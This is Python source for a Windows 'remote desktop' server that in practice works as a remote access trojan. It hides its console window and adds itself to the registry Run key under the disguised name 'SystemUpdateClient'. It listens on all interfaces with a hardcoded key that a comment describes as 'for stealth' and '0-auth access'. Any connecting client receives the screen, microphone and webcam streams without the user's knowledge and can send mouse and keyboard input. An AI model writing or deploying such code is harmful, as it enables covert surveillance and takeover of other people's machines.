import socket
import threading
import time
import json
import io
import os
import sys
import ctypes
from PIL import Image
import dxcam
import mss
import cv2
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Controller as KeyboardController, Key
import psutil

try:
    import pyaudio
    HAS_AUDIO = True
except ImportError:
    HAS_AUDIO = False

# Local import for network utilities
from utilities import NetworkCore

# AES-256 Key for encryption (must be same on client/server)
# In a real scenario this might be dynamically exchanged (Diffie-Hellman), 
# but for stealth we use a pre-shared key for 0-auth access.
PSK = b"MySuperSecretKeyForRemoteDesk123" # Exactly 32 bytes

PORT = 5555
QUALITY = 40
TARGET_FPS = 60
STEALTH_MODE = True
AUTOSTART = True

class UltimateServer:
    def __init__(self):
        self.net = NetworkCore(PSK)
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("0.0.0.0", PORT))
        self.server_sock.listen(5)
        
        # UDP socket for Discord-like media streaming
        self.udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp_sock.bind(("0.0.0.0", PORT))
        self.client_udp_addr = None
        
        self.mouse = MouseController()
        self.keyboard = KeyboardController()
        
        self.clients = []
        self.running = True
        
        # Determine capture method
        self.dxcamera = None
        self.sct = mss.mss()
        self.use_dxcam = False
        try:
            self.dxcamera = dxcam.create()
            if self.dxcamera:
                self.use_dxcam = True
        except Exception:
            pass
            
        self.monitors = self.sct.monitors[1:] # Discard "all in one" monitor at index 0
        
        if STEALTH_MODE:
            self.hide_console()
            
        if AUTOSTART:
            self.add_to_startup()

    def hide_console(self):
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except Exception:
            pass

    def add_to_startup(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
            app_path = os.path.realpath(sys.argv[0])
            winreg.SetValueEx(key, "SystemUpdateClient", 0, winreg.REG_SZ, f'pythonw "{app_path}"' if app_path.endswith('.py') else f'"{app_path}"')
            winreg.CloseKey(key)
        except:
            pass
            
    def udp_listener(self):
        while self.running:
            try:
                data, addr = self.udp_sock.recvfrom(1024)
                if data == b"PUNCH":
                    self.client_udp_addr = addr
            except:
                pass

    def handle_client(self, client_sock, addr):
        try:
            metadata = {
                "os": sys.platform,
                "hostname": socket.gethostname(),
                "user": os.getlogin(),
                "monitors": [{"width": m["width"], "height": m["height"], "left": m["left"], "top": m["top"]} for m in self.monitors],
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "disk": psutil.disk_usage('/').percent
            }
            # Initial Handshake
            self.net.send_packet(client_sock, 0, {"type": "handshake", "data": metadata}, is_json=True)
            
            # Start streaming threads
            threading.Thread(target=self.stream_screen, args=(client_sock,), daemon=True).start()
            
            if HAS_AUDIO:
                threading.Thread(target=self.stream_audio, args=(client_sock,), daemon=True).start()
            threading.Thread(target=self.stream_webcam, args=(client_sock,), daemon=True).start()
            threading.Thread(target=self.stream_system_stats, args=(client_sock,), daemon=True).start()

            # Handle incoming commands
            while self.running:
                packet_type, data = self.net.recv_packet(client_sock)
                if packet_type is None:
                    break
                    
                if packet_type in (2, 5) and isinstance(data, dict):
                    if data.get("type") == "input":
                        self.process_input(data["event"])
                    elif data.get("type") == "chat":
                        print("Chat received:", data["msg"])
                    
        except Exception as e:
            print("Client loop error:", e)
        finally:
            client_sock.close()
            if client_sock in self.clients:
                self.clients.remove(client_sock)
                
    def process_input(self, event):
        try:
            if event["t"] == "mm": # mouse move
                self.mouse.position = (event["x"], event["y"])
            elif event["t"] == "mc": # mouse click
                btn = Button.left if event["b"] == "left" else Button.right
                if event["p"]: self.mouse.press(btn)
                else: self.mouse.release(btn)
            elif event["t"] == "kd" or event["t"] == "ku": # key down/up
                key_str = event["k"]
                # Map Tkinter keysyms to pynput Keys
                key_map = {
                    "Return": Key.enter,
                    "BackSpace": Key.backspace,
                    "Tab": Key.tab,
                    "Escape": Key.esc,
                    "space": Key.space,
                    "Delete": Key.delete,
                    "Shift_L": Key.shift,
                    "Shift_R": Key.shift_r,
                    "Control_L": Key.ctrl,
                    "Control_R": Key.ctrl_r,
                    "Alt_L": Key.alt,
                    "Alt_R": Key.alt_r,
                    "Caps_Lock": Key.caps_lock,
                    "Left": Key.left,
                    "Right": Key.right,
                    "Up": Key.up,
                    "Down": Key.down,
                    "Page_Up": Key.page_up,
                    "Page_Down": Key.page_down,
                    "Home": Key.home,
                    "End": Key.end,
                    "F1": Key.f1, "F2": Key.f2, "F3": Key.f3, "F4": Key.f4,
                    "F5": Key.f5, "F6": Key.f6, "F7": Key.f7, "F8": Key.f8,
                    "F9": Key.f9, "F10": Key.f10, "F11": Key.f11, "F12": Key.f12
                }
                
                target_key = key_map.get(key_str, key_str)
                if event["t"] == "kd":
                    self.keyboard.press(target_key)
                else:
                    self.keyboard.release(target_key)
        except Exception as e:
            pass

    def stream_screen(self, sock):
        frame_time = 1.0 / TARGET_FPS
        if self.use_dxcam:
            self.dxcamera.start(target_fps=TARGET_FPS)
        
        import numpy as np
        while self.running and sock in self.clients:
            start_t = time.time()
            try:
                # Capture monitors
                for i, monitor in enumerate(self.monitors):
                    frame_bytes = None
                    if self.use_dxcam and i == 0:
                        # DXCam currently best supports primary monitor easily
                        frame = self.dxcamera.get_latest_frame()
                        if frame is not None:
                            bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                            _, encoded = cv2.imencode('.jpg', bgr, [int(cv2.IMWRITE_JPEG_QUALITY), QUALITY])
                            frame_bytes = encoded.tobytes()
                    
                    if frame_bytes is None:
                        sct_img = self.sct.grab(monitor)
                        bgra = np.array(sct_img)
                        bgr = cv2.cvtColor(bgra, cv2.COLOR_BGRA2BGR)
                        _, encoded = cv2.imencode('.jpg', bgr, [int(cv2.IMWRITE_JPEG_QUALITY), QUALITY])
                        frame_bytes = encoded.tobytes()
                    
                    if frame_bytes:
                        # Packet struct: [monitor_idx (1 byte)] + [jpeg bytes]
                        payload = bytes([i]) + frame_bytes
                        # Sending type 1 for video frame over TCP to bypass 65KB limit
                        self.net.send_packet(sock, 1, payload)
                        
            except Exception as e:
                print("Screen stream error:", e)
                break
                
            elapsed = time.time() - start_t
            if elapsed < frame_time:
                time.sleep(frame_time - elapsed)
                
        if self.use_dxcam:
            self.dxcamera.stop()

    def stream_audio(self, sock):
        if not HAS_AUDIO: return
        p = pyaudio.PyAudio()
        stream = None
        try:
            # Note: Loopback recording normally connects to WASAPI loopback, 
            # this gets default input (microphone). For sys audio on PyAudio we need loopback.
            # Using default input for now as placeholder for microphone.
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            while self.running and sock in self.clients:
                data = stream.read(1024, exception_on_overflow=False)
                import zlib
                # Type 3 for Audio over TCP
                self.net.send_packet(sock, 3, zlib.compress(data, level=3))
                # Audio timing is handled by hardware blocking read
        except Exception as e:
            pass
        finally:
            if stream: stream.close()
            p.terminate()

    def stream_webcam(self, sock):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return
            
        while self.running and sock in self.clients:
            ret, frame = cap.read()
            if not ret: break
            
            # Compress using cv2 
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), QUALITY])
            # Type 4 for Webcam over TCP
            self.net.send_packet(sock, 4, buffer.tobytes())
            time.sleep(1/30.0) # 30 FPS webcam
        cap.release()

    def stream_system_stats(self, sock):
        while self.running and sock in self.clients:
            stats = {
                "type": "stats",
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "disk": psutil.disk_usage('/').percent
            }
            try:
                self.net.send_packet(sock, 6, stats, is_json=True)
            except:
                break
            time.sleep(1.0) # update every second

    def run(self):
        threading.Thread(target=self.udp_listener, daemon=True).start()
        while self.running:
            try:
                client, addr = self.server_sock.accept()
                self.clients.append(client)
                threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
            except:
                pass

if __name__ == "__main__":
    server = UltimateServer()
    server.run()
